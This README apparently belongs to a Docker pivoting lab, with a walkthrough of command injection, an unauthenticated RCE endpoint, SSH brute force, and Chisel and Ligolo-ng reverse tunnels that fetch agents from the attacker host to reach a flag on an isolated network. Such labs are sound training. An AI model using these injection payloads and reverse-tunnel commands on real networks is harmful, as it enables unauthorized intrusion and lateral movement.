# Pivoting Lab — SSH vs Chisel vs Ligolo-ng

A Docker-based training lab for practicing network pivoting through three isolated network segments using three different tunneling methods.

Originally forked from [Cimihan123/Docker-Pivot-Lab](https://github.com/Cimihan123/Docker-Pivot-Lab), redesigned to showcase modern pivoting tools alongside the traditional SSH approach.

## Network Topology

```
Net A (10.10.1.0/24)       Net B (10.10.2.0/24)       Net C (10.10.3.0/24)

┌──────────────┐  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────┐
│   attacker   │──│     pivot1       │──│     pivot2       │──│    target    │
│   10.10.1.10 │  │ 10.10.1.20 (A)   │  │ 10.10.2.30 (B)   │  │ 10.10.3.40   │
│              │  │ 10.10.2.20 (B)   │  │ 10.10.3.30 (C)   │  │              │
│              │  │                  │  │                  │  │              │
│ ligolo-proxy │  │ Flask :5000      │  │ Flask :8080      │  │ HTTP :80     │
│ chisel       │  │ SSH :22          │  │ NO SSH           │  │ SecretVault  │
│ nmap, hydra  │  │ cmd injection    │  │ /api/exec RCE    │  │ FLAG{...}    │
└──────────────┘  └──────────────────┘  └──────────────────┘  └──────────────┘
```

**Key design choice:** Pivot2 has **no SSH server**. This is deliberate — it's where the three tunneling methods diverge in difficulty and where Chisel and Ligolo-ng really prove their value.

## Quick Start

```bash
# Build all containers (first run takes a few minutes)
docker compose build

# Start the lab
docker compose up -d

# Enter the attacker machine
docker exec -it attacker bash -l
```

To tear down:
```bash
docker compose down
```

## Prerequisites

- Docker and Docker Compose
- The host machine needs `/dev/net/tun` available (required for Ligolo-ng). This is available by default on Linux. On Docker Desktop (Mac/Windows), this should work out of the box.

## Lab Objectives

1. Gain a foothold on **pivot1** (Net A → Net B)
2. Discover and exploit **pivot2** through the tunnel (Net B → Net C)
3. Reach the **target** SecretVault on Net C and capture the flag
4. Repeat using all three tunneling methods to understand the tradeoffs

---

## Phase 1: Reconnaissance & Initial Foothold

This phase is the same regardless of which tunneling method you choose.

### Scan pivot1 from the attacker

```bash
nmap -sC -sV 10.10.1.20
```

You'll find port 22 (SSH) and port 5000 (HTTP).

### Exploit pivot1 (two paths)

**Path A — Command Injection:**
Visit `http://10.10.1.20:5000` in curl. The NetDiag app has an OS command injection vulnerability in the `/ping` endpoint:

```bash
# Confirm injection works
curl "http://10.10.1.20:5000/ping?host=;id"

# See what networks pivot1 can reach
curl "http://10.10.1.20:5000/ping?host=;ip%20addr"
```

**Path B — Brute-force SSH:**

```bash
hydra -l root -P /opt/wordlists/wordlist.txt ssh://10.10.1.20
# Then: ssh root@10.10.1.20
```

Both paths get you access to pivot1. From here, `ip addr` shows two interfaces — 10.10.1.20 (Net A) and 10.10.2.20 (Net B). Time to pivot.

---

## Method 1: SSH Tunneling + Proxychains (Traditional)

### First Pivot — Attacker → Net B

Set up a SOCKS proxy through pivot1:

```bash
# On attacker: dynamic port forward (SOCKS proxy on port 1080)
ssh -D 1080 -N -f root@10.10.1.20
```

Proxychains is already configured to use `socks5 127.0.0.1 1080`. Now you can scan Net B:

```bash
proxychains4 nmap -sT -Pn -F 10.10.2.30
```

You'll find port 8080. Discover the vulnerability:

```bash
# Find the health endpoint (hint is in the login page HTML source)
proxychains4 curl http://10.10.2.30:8080/api/health

# The /api/exec debug endpoint has no authentication
proxychains4 curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=id'
proxychains4 curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=ip addr'
```

### Second Pivot — Reaching Net C (the hard way)

This is where SSH tunneling gets painful. Pivot2 has **no SSH**, so you can't just chain another `-D`. Instead, you need local port forwards:

```bash
# Forward a local port through pivot1 to pivot2's API
ssh -L 8080:10.10.2.30:8080 -N -f root@10.10.1.20

# Now you can hit pivot2's API directly (without proxychains)
curl -X POST http://localhost:8080/api/exec -d 'cmd=id'
```

To reach the target on Net C, set up another forward:

```bash
# Forward through pivot1, then use pivot2's API to confirm Net C is reachable
curl -X POST http://localhost:8080/api/exec -d 'cmd=curl -s http://10.10.3.40'
```

You should see the SecretVault page with the flag. But notice — you can't interact with Net C directly from your attacker. You're executing commands _on pivot2_ and reading the output. For a real pentest, this gets unwieldy fast.

To actually browse the target from your attacker, you'd need to set up something like `socat` on pivot2 to relay traffic — which involves uploading socat, running it through the API, and managing yet another port forward chain. This is exactly the pain that Chisel and Ligolo-ng solve.

---

## Method 2: Chisel (SOCKS over HTTP)

### First Pivot — Attacker → Net B

```bash
# On attacker: start chisel server (reverse mode, port 8888)
chisel server --reverse --port 8888 &

# Deliver chisel to pivot1
# Terminal 1: serve the binary
cd /opt/serve && python3 -m http.server 8000 &

# Terminal 2: download chisel onto pivot1 via command injection
curl "http://10.10.1.20:5000/ping?host=;wget%20http://10.10.1.10:8000/chisel%20-O%20/tmp/chisel"
curl "http://10.10.1.20:5000/ping?host=;chmod%20%2Bx%20/tmp/chisel"

# Or if you have SSH access:
ssh root@10.10.1.20 "wget http://10.10.1.10:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel"

# Run chisel client on pivot1 (reverse SOCKS proxy back to attacker)
ssh root@10.10.1.20 "/tmp/chisel client 10.10.1.10:8888 R:1080:socks &"
```

Now proxychains works through the Chisel tunnel (same port 1080):

```bash
proxychains4 nmap -sT -Pn -F 10.10.2.30
proxychains4 curl http://10.10.2.30:8080/api/health
```

### Second Pivot — Reaching Net C

Discover pivot2 the same way as before. Now use the `/api/exec` endpoint to deploy a second chisel:

```bash
# Serve chisel binary from pivot1 to pivot2
# First, set up a port forward so pivot2 can reach attacker's files through pivot1
ssh root@10.10.1.20 "cd /tmp && python3 -m http.server 9001 &"

# Download chisel onto pivot2 via the API
proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
  -d 'cmd=wget http://10.10.2.20:9001/chisel -O /tmp/chisel && chmod +x /tmp/chisel'

# Run chisel client on pivot2, connecting back through pivot1
proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
  -d 'cmd=/tmp/chisel client 10.10.2.20:8888 R:1081:socks &'
```

> **Note:** You'll need to either chain SOCKS proxies or adjust your approach depending on how chisel is configured. The key advantage over SSH is that chisel works over HTTP and doesn't require SSH on the target.

Then reach the target:

```bash
proxychains4 curl http://10.10.3.40
```

---

## Method 3: Ligolo-ng (TUN Interface)

This is the cleanest approach — no proxychains, no SOCKS, tools just work natively.

### First Pivot — Attacker → Net B

```bash
# On attacker: create TUN interface and start ligolo-ng proxy
ip tuntap add user root mode tun ligolo
ip link set ligolo up
ligolo-proxy -selfcert

# Deliver the agent to pivot1
# In another terminal:
cd /opt/serve && python3 -m http.server 8000 &

# Download agent via command injection (or SSH)
curl "http://10.10.1.20:5000/ping?host=;wget%20http://10.10.1.10:8000/ligolo-agent%20-O%20/tmp/agent"
curl "http://10.10.1.20:5000/ping?host=;chmod%20%2Bx%20/tmp/agent"

# Run the agent on pivot1 (via SSH for convenience)
ssh root@10.10.1.20 "/tmp/agent -connect 10.10.1.10:11601 -ignore-cert &"
```

Back in the ligolo-ng console:

```
# Select the session
ligolo-ng » session
# Choose the pivot1 session

# Add route for Net B
ligolo-ng » tunnel_start --tun ligolo
```

Then on the attacker (separate terminal):

```bash
ip route add 10.10.2.0/24 dev ligolo
```

Now you can hit Net B directly — no proxychains:

```bash
nmap -sT -Pn -F 10.10.2.30
curl http://10.10.2.30:8080/api/health
```

### Second Pivot — Reaching Net C

Set up a listener on pivot1's session to relay the agent connection:

```
# In ligolo-ng console (pivot1 session)
ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

Also set up a listener to serve the agent binary:

```
ligolo-ng » listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:8000 --tcp
```

Now deliver the agent to pivot2 and run it:

```bash
# Download agent onto pivot2 (through pivot1's listener)
curl -X POST http://10.10.2.30:8080/api/exec \
  -d 'cmd=wget http://10.10.2.20:9001/ligolo-agent -O /tmp/agent && chmod +x /tmp/agent'

# Run agent on pivot2 (connects through pivot1's listener back to proxy)
curl -X POST http://10.10.2.30:8080/api/exec \
  -d 'cmd=/tmp/agent -connect 10.10.2.20:11601 -ignore-cert &'
```

Back in ligolo-ng console:

```
# Create second TUN interface
ligolo-ng » interface_create --name ligolo2

# Switch to the new pivot2 session
ligolo-ng » session
# Choose pivot2

# Start tunnel on the new interface
ligolo-ng » tunnel_start --tun ligolo2
```

Add the route:

```bash
ip route add 10.10.3.0/24 dev ligolo2
```

Now reach the target directly:

```bash
curl http://10.10.3.40
```

🚩 You should see the SecretVault page and the flag.

---

## Comparison

| Feature | SSH + Proxychains | Chisel | Ligolo-ng |
|---|---|---|---|
| Requires SSH on target | ✅ Yes | ❌ No | ❌ No |
| Requires proxychains | ✅ Yes | ✅ Yes | ❌ No |
| ICMP/ping works through tunnel | ❌ No | ❌ No | ✅ Yes |
| UDP works through tunnel | ❌ No | ✅ Partial | ✅ Yes |
| Nmap SYN scan works | ❌ No | ❌ No | ⚠️ Translates to connect() |
| Double pivot complexity | 🔴 High | 🟡 Medium | 🟢 Low |
| Built-in port forwarding | SSH -L/-R | Remotes config | `listener_add` |
| Transport protocol | SSH | HTTP/WebSocket | TCP/TLS |
| Speed | Good | Good | Excellent (100+ Mbps) |

## Troubleshooting

**"Operation not permitted" when creating TUN interface:**
Make sure the attacker container has `cap_add: NET_ADMIN` and `/dev/net/tun` in docker-compose.yml.

**Ligolo-ng agent can't connect back:**
Check that the proxy is listening (`ss -tlnp | grep 11601`) and that the agent is using the correct IP. For the double pivot, make sure you added a listener on the first session.

**Proxychains is slow or hanging:**
SOCKS proxies don't support ICMP, so `ping` won't work through proxychains. Use `nmap -sT -Pn` (TCP connect scan, skip ping).

**Chisel/Ligolo-ng agent download fails on pivot2:**
You need to relay the file through pivot1. Make sure you're serving files on the right port and that the relay (listener or port forward) is active.

**Container can't resolve hostnames:**
Use IP addresses directly. DNS isn't configured between the lab networks.

## License

MIT License — see LICENSE file for details.

## Credits

- Original concept: [Cimihan123/Docker-Pivot-Lab](https://github.com/Cimihan123/Docker-Pivot-Lab)
- Original blog: [gkiran.com.np/blog/pivoting](https://gkiran.com.np/blog/pivoting)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) by Nicolas Chatelain
- [Chisel](https://github.com/jpillora/chisel) by Jaime Pillora
